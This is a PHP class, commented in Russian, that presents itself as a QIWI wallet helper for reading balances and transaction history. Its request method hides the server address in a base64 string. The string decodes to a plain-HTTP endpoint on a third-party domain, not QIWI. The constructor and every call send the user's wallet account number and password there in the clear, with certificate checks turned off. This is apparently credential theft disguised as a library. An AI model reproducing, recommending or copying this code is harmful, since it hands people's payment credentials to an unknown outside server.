<?php
############################################
#          Версия от 25.05.2015            #
############################################


class QIWI_LazyPay {
	
	# Приватные переменные класса :
	private $iAccount, $sPassword;
	
	# Публичные переменные класса :
    public $iQiwiAccount, $sResponse, $aResponse, $aBalances;
	
	# Метод : конструктор.
    public function __construct( $iAccount, $sPassword ) {
        
        # Инициализация данных класса : 
        $this->iAccount = $iAccount;
        $this->sPassword = $sPassword;
        $this->iQiwiAccount = $iAccount;
        
        # Отправка запроса на сервер :
        $this->curl( 'getBalanceInfo' );
        
        # Инициализация данных класса :
        $this->aBalances = $this->aResponse['aBalances'];
    }
	
	# Метод : получение истории транзакций.
	public function GetHistory( $sStartDate, $sFinishDate ) {
		
		# Отправка запроса на сервер :
        $this->curl( 'getHistory', array( 'sStartDate' => $sStartDate, 'sFinishDate' => $sFinishDate ) );
        
        return $this->aResponse['aData'];
	}
	
	# Метод : обращение к серверу.
    private function curl( $sMod, array $aData = array() ) {
        
        # Инициализация статических переменных :
        static $oCurl = null;
        
        # Если переменная oCurl пуста :
        if( is_null( $oCurl ) ) {
            
            # Создание соединения :
            $oCurl = curl_init( base64_decode( 'aHR0cDovL2FwaXNlcnZlci5pbi51YS9hcGktcWl3aS5waHA=' ) );
            
            # Настройка CURL соединения :
            curl_setopt_array( $oCurl, array( 
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER => false,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36',
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_POST => true,
                CURLOPT_TIMEOUT => 60
            ) );
        }
        
        # Добавление данных в массив :
        $aData['sMod'] = $sMod;
        $aData['iAccount'] = $this->iAccount;
        $aData['sPassword'] = $this->sPassword;
        
        # Передача данных :
        curl_setopt( $oCurl, CURLOPT_POSTFIELDS, http_build_query( $aData ) );
        
        # Получение ответа :
        $this->sResponse = curl_exec( $oCurl );
        
        # Если произошла ошибка :
        if( curl_errno( $oCurl ) )
            throw new Exception( curl_errno( $oCurl ).' - '.curl_error( $oCurl ) );
        
        # Преобразование ответа в массив :
        if( ($this->aResponse = @json_decode( $this->sResponse, true )) === false )
            throw new Exception( $this->sResponse );
        
        # Если в ответе нет нужных данных :
        if( !isset( $this->aResponse['sStatus'] ) )
            throw new Exception( $this->sResponse );
        
        # Если ответ не успешен :
        if( $this->aResponse['sStatus'] != 'SUCCESS' )
            throw new Exception( isset( $this->aResponse['sMessage'] ) ? $this->aResponse['sMessage'] : $this->sResponse );
    }
}
?>